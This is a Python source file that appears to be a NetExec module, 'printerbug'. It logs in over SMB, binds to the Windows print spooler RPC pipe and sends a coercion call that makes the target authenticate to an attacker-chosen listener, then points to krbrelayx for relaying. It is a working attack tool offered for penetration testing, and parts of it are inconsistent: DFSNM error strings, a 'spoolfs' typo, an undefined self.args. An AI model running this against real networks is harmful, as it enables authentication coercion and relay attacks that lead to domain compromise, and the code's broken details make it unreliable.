from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import ULONG, WSTR, DWORD
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.uuid import uuidtup_to_bin
from nxc.logger import nxc_logger


class NXCModule:
    name = "printerbug"
    description = "Module to check if the Target is vulnerable to PrinterBug"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.listener = None

    def options(self, context, module_options):
        """LISTENER    Listener Address (defaults to 127.0.0.1)"""
        self.listener = "127.0.0.1"
        if "LISTENER" in module_options:
            self.listener = module_options["LISTENER"]

    def on_login(self, context, connection):
        trigger = TriggerAuth()
        dce = trigger.connect(
            username=connection.username,
            password=connection.password,
            domain=connection.domain,
            lmhash=connection.lmhash,
            nthash=connection.nthash,
            target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
            doKerberos=connection.kerberos,
            dcHost=connection.kdcHost,
            aesKey=connection.aesKey,
        )

        if dce is not None:
            context.log.debug("Target is vulnerable to PrinterBug")
            trigger.RpcRemoteFindFirstPrinterChange(dce, self.listener)
            context.log.highlight("VULNERABLE")
            context.log.highlight("Next step: https://github.com/dirkjanm/krbrelayx")
            dce.disconnect()

        else:
            context.log.debug("Target is not vulnerable to PrinterBug")


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return f"DFSNM SessionError: code: 0x{self.error_code:x} - {error_msg_short} - {error_msg_verbose}"
        else:
            return f"DFSNM SessionError: unknown error code: 0x{self.error_code:x}"


################################################################################
# RPC CALLS
################################################################################
class RpcRemoteFindFirstPrinterChange(NDRCALL):
    opnum = 13
    structure = (
        ("ServerName", WSTR),
        ("RootShare", WSTR),
        ("ApiFlags", DWORD),
    )


class RpcRemoteFindFirstPrinterChangeResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


class NetrDfsAddRoot(NDRCALL):
    opnum = 12
    structure = (
        ("ServerName", WSTR),
        ("RootShare", WSTR),
        ("Comment", WSTR),
        ("ApiFlags", DWORD),
    )


class NetrDfsAddRootResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


class TriggerAuth:
    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost):
        rpctransport = transport.DCERPCTransportFactory(r"ncacn_np:%s[\PIPE\spoolss]" % target)
        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash,
                aesKey=aesKey,
            )

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        # if target:

        rpctransport.setRemoteHost(target)
        dce = rpctransport.get_dce_rpc()
        nxc_logger.debug("[-] Connecting to {}".format(r"ncacn_np:%s[\PIPE\spoolfs]") % target)
        try:
            dce.connect()
        except Exception as e:
            nxc_logger.debug(f"Something went wrong, check error status => {e!s}")
            return None
        try:
            dce.bind(uuidtup_to_bin(("12345678-1234-ABCD-EF00-0123456789AB", "1.0")))
        except Exception as e:
            nxc_logger.debug(f"Something went wrong, check error status => {e!s}")
            return None
        nxc_logger.debug("[+] Successfully bound!")
        return dce

    def RpcRemoteFindFirstPrinterChange(self, dce, listener):
        nxc_logger.debug("[-] Sending RpcRemoteFindFirstPrinterChange!")
        try:
            request = RpcRemoteFindFirstPrinterChange()
            request["ServerName"] = f"{listener}\x00"
            request["RootShare"] = "test\x00"
            request["ApiFlags"] = 1
            if self.args.verbose:
                nxc_logger.debug(request.dump())
            dce.request(request)

        except Exception as e:
            nxc_logger.debug(e)
